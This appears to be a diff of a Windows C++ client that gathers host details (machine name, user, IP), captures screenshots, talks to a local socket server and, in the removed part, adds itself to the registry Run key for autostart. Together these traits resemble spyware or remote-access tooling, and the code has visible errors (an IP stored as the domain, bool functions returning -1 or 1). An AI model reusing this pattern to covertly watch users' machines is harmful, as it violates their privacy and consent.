@@ -1,16 +1,47 @@
 #include "client.h"
 
 
-struct GET_PC_DATA_REQUSET
+bool Client::GetDataPc(GET_PC_DATA_REQUSET& pc_data)
 {
-    std::string domain;
-    std::string machine;
-    std::string ip;
-    std::string user;
-};
+    TCHAR  info_buf[32767];
+    DWORD  buf_char_count = 32767;
+
+    // --- Domain ---
+    IP_ADAPTER_INFO AdapterInfo[16];
+    DWORD dwBufLen = sizeof(AdapterInfo);
+    DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
+
+    pc_data.domain = AdapterInfo->IpAddressList.IpAddress.String;
+
+    // --- machine ---
+    if (!GetComputerName(info_buf, &buf_char_count))
+        return false;
+    pc_data.machine = info_buf;
 
 
-int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    // --- IP ---
+    if (dwStatus == ERROR_SUCCESS) {
+        PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
+        while (pAdapterInfo) {
+            pc_data.ip = pAdapterInfo->IpAddressList.IpAddress.String;
+            pAdapterInfo = pAdapterInfo->Next;
+        }
+    }
+    else
+        return -1;
+
+    // --- User ---
+    if (!GetUserName(info_buf, &buf_char_count))
+        return false;
+
+    pc_data.user = info_buf;
+
+    return true;
+}
+
+
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
+{
     using namespace Gdiplus;
     UINT  num = 0;
     UINT  size = 0;
@@ -39,7 +70,9 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
     return 0;
 }
 
-void gdiscreen() {
+
+void gdiscreen()
+{
     using namespace Gdiplus;
     IStream* istream;
     HRESULT res = CreateStreamOnHGlobal(NULL, true, &istream);
@@ -72,49 +105,7 @@ void gdiscreen() {
 }
 
 
-bool GetDataPc(GET_PC_DATA_REQUSET &pc_data)
-{
-    TCHAR  info_buf[32767];
-    DWORD  buf_char_count = 32767;
-
-    // --- Domain ---
-    IP_ADAPTER_INFO AdapterInfo[16];
-    DWORD dwBufLen = sizeof(AdapterInfo);
-    DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
-
-    pc_data.domain = AdapterInfo->IpAddressList.IpAddress.String;
-
-    // --- machine ---
-    if (!GetComputerName(info_buf, &buf_char_count))
-        return false;
-    pc_data.machine = info_buf;
-
-
-    // --- IP ---
-    if (dwStatus == ERROR_SUCCESS) {
-        PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
-        while (pAdapterInfo) {
-            pc_data.ip = pAdapterInfo->IpAddressList.IpAddress.String;
-            std::cout << "IP Address: " << pAdapterInfo->IpAddressList.IpAddress.String << std::endl;
-            pAdapterInfo = pAdapterInfo->Next;
-        }
-    }
-    else {
-        std::cerr << "Failed to get adapter information. Error code: " << dwStatus << std::endl;
-        return 1;
-    }
-
-    // --- User ---
-    if (!GetUserName(info_buf, &buf_char_count))
-        return false;
-
-    pc_data.user = info_buf;
-
-    return true;
-}
-
-// --- Client ---
-int Client()
+int ClientStart()
 {
     const char ip_address[] = "127.0.0.1";
     const int port = 55555;
@@ -235,76 +226,4 @@ int Client()
     // Close socket and cleanup winsock
     closesocket(sock);
     WSACleanup();
-}
-
-
-bool AddToStartup(const wchar_t* programPath) {
-    HKEY hKey;
-    LONG result = RegCreateKeyExW(
-        HKEY_CURRENT_USER,
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        0,
-        NULL,
-        REG_OPTION_NON_VOLATILE,
-        KEY_WRITE,
-        NULL,
-        &hKey,
-        NULL);
-
-    if (result != ERROR_SUCCESS) {
-        return false;
-    }
-
-    DWORD dwValueSize = (wcslen(programPath) + 1) * sizeof(wchar_t);
-    result = RegSetValueExW(
-        hKey,
-        NULL,
-        0,
-        REG_SZ,
-        (LPBYTE)programPath,
-        dwValueSize);
-
-    RegCloseKey(hKey);
-
-    return (result == ERROR_SUCCESS);
-}
-
-
-bool RemoveFromStartup(const wchar_t* programPath) {
-    HKEY hKey;
-    LONG result = RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        0,
-        KEY_WRITE,
-        &hKey);
-
-    if (result != ERROR_SUCCESS) {
-        return false;
-    }
-
-    result = RegDeleteValueW(hKey, NULL);
-
-    RegCloseKey(hKey);
-
-    return (result == ERROR_SUCCESS);
-}
-
-
-int main()
-{
-    // Add auto run
-    wchar_t path[MAX_PATH];
-    GetModuleFileNameW(NULL, path, MAX_PATH);
-
-    const wchar_t* programPath = path;
-    if (!AddToStartup(programPath))
-        return -1;
-  
-
-    // Start Client
-    Client();
-
-    system("pause");
-    return 0;
 }
